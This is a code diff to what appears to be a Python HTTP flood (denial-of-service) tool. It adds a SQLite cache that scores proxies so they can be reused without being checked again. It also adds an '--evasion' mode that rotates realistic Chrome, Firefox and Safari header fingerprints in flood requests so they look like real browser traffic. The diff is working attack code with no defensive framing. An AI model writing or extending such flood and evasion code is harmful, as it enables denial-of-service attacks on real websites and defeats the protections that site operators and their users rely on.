@@ -3,6 +3,7 @@
 import logging
 import random
 import re
+import sqlite3
 import ssl
 import sys
 from base64 import b64encode
@@ -57,8 +58,8 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, get, cookies
 from yarl import URL
 
-# --- Tactical Configuration (v1.1.2) ---
-__version__: str = "1.1.2"
+# --- Tactical Configuration (v1.1.3) ---
+__version__: str = "1.1.3"
 __dir__: Path = Path(__file__).parent
 
 # Setup High-Signal Logging
@@ -145,6 +146,54 @@ def exit(*message: str) -> None:
     shutdown()
     _exit(1)
 
+
+# --- Persistent Intelligence Database ---
+class IntelligenceDB:
+    def __init__(self, db_path: str = "files/intelligence.db"):
+        self.db_path = __dir__ / db_path
+        self.db_path.parent.mkdir(parents=True, exist_ok=True)
+        self._init_db()
+
+    def _init_db(self):
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS proxy_intel (
+                    ip_port TEXT PRIMARY KEY,
+                    latency REAL,
+                    score REAL,
+                    failures INTEGER,
+                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+            conn.commit()
+
+    def update_proxy_scores(self, proxies: List['TacticalProxy']):
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            now = datetime.now()
+            for p in proxies:
+                cursor.execute('''
+                    INSERT INTO proxy_intel (ip_port, latency, score, failures, last_seen)
+                    VALUES (?, ?, ?, ?, ?)
+                    ON CONFLICT(ip_port) DO UPDATE SET
+                        latency=excluded.latency,
+                        score=excluded.score,
+                        failures=failures + excluded.failures,
+                        last_seen=excluded.last_seen
+                ''', (str(p.base), p.latency_ms, p.score, p.fail_count, now))
+            conn.commit()
+
+    def get_proxy_intel(self, ip_port: str) -> Optional[Dict]:
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute('SELECT latency, score, failures FROM proxy_intel WHERE ip_port=?', (ip_port,))
+            row = cursor.fetchone()
+            if row:
+                return {'latency': row[0], 'score': row[1], 'failures': row[2]}
+        return None
+
+INTEL_DB = IntelligenceDB()
 
 # --- Dynamic Scaling Globals ---
 class EngineState:
@@ -397,6 +446,16 @@ class TacticalProxyValidator:
                 target_host = target_url
 
         def _check(proxy: Proxy) -> TacticalProxy:
+            p_str = str(proxy)
+            intel = INTEL_DB.get_proxy_intel(p_str)
+            
+            # If we have recent, high-quality intel, skip active verification to speed up deployment
+            if intel and intel['failures'] < 3 and intel['latency'] < 1500:
+                p = TacticalProxy(proxy, intel['latency'], True)
+                p.score = intel['score']
+                p.fail_count = intel['failures']
+                return p
+                
             start_time = time()
             try:
                 # 1. Connection Check
@@ -453,6 +512,7 @@ class TacticalProxyValidator:
         )
         
         tactical_proxies.sort(key=lambda p: p.score, reverse=True)
+        INTEL_DB.update_proxy_scores(tactical_proxies)
         return tactical_proxies
 
 
@@ -483,6 +543,8 @@ class TacticalProxyPool:
             self._pool_copy = list(self._proxies) # Create a read-only copy for lock-free access
             self._failures = {} 
             self._last_weight_update = time()
+            # Periodically sync to DB
+            Thread(target=INTEL_DB.update_proxy_scores, args=(self._pool_copy,), daemon=True).start()
 
     def update_pool(self, new_proxies: List[TacticalProxy]):
         with self._lock:
@@ -1347,24 +1409,70 @@ class HttpFlood(Thread):
                 "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
             ]
         self._useragents, self._req_type = list(useragents), self.getMethodType(method)
+        self._rebuild_payload()
+
+    def _rebuild_payload(self):
+        """Advanced Fingerprinting: Rebuilds payload with dynamic, realistic browser headers."""
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (
             self._req_type,
-            target.raw_path_qs,
+            self._target.raw_path_qs,
             randchoice(["1.0", "1.1", "1.2"]),
         )
-        self._payload = (
-            self._defaultpayload + "Accept-Encoding: gzip, deflate, br\r\n"
+        
+        # Advanced Evasion Fingerprints
+        fingerprints = [
+            # Chrome Windows
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
+            "Accept-Encoding: gzip, deflate, br\r\n"
             "Accept-Language: en-US,en;q=0.9\r\n"
-            "Cache-Control: max-age=0\r\n"
-            "Connection: keep-alive\r\n"
+            "Sec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"\r\n"
+            "Sec-Ch-Ua-Mobile: ?0\r\n"
+            "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
             "Sec-Fetch-Dest: document\r\n"
             "Sec-Fetch-Mode: navigate\r\n"
             "Sec-Fetch-Site: none\r\n"
             "Sec-Fetch-User: ?1\r\n"
-            "Sec-Gpc: 1\r\n"
-            "Pragma: no-cache\r\n"
-            "Upgrade-Insecure-Requests: 1\r\n"
-        )
+            "Upgrade-Insecure-Requests: 1\r\n",
+            
+            # Firefox Mac
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+            "Accept-Encoding: gzip, deflate, br\r\n"
+            "Accept-Language: en-US,en;q=0.5\r\n"
+            "Sec-Fetch-Dest: document\r\n"
+            "Sec-Fetch-Mode: navigate\r\n"
+            "Sec-Fetch-Site: none\r\n"
+            "Sec-Fetch-User: ?1\r\n"
+            "Upgrade-Insecure-Requests: 1\r\n",
+            
+            # Safari iOS
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+            "Accept-Encoding: gzip, deflate\r\n"
+            "Accept-Language: en-US,en;q=0.9\r\n"
+            "Sec-Fetch-Dest: document\r\n"
+            "Sec-Fetch-Mode: navigate\r\n"
+            "Sec-Fetch-Site: none\r\n"
+        ]
+
+        # Use basic static headers if not explicitly in evasion mode to save CPU
+        if "--evasion" in argv:
+            selected_fp = randchoice(fingerprints)
+            conn_type = randchoice(["keep-alive", "Upgrade"])
+        else:
+            selected_fp = (
+                "Accept-Encoding: gzip, deflate, br\r\n"
+                "Accept-Language: en-US,en;q=0.9\r\n"
+                "Cache-Control: max-age=0\r\n"
+                "Sec-Fetch-Dest: document\r\n"
+                "Sec-Fetch-Mode: navigate\r\n"
+                "Sec-Fetch-Site: none\r\n"
+                "Sec-Fetch-User: ?1\r\n"
+                "Sec-Gpc: 1\r\n"
+                "Pragma: no-cache\r\n"
+                "Upgrade-Insecure-Requests: 1\r\n"
+            )
+            conn_type = "keep-alive"
+
+        self._payload = self._defaultpayload + selected_fp + f"Connection: {conn_type}\r\n"
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
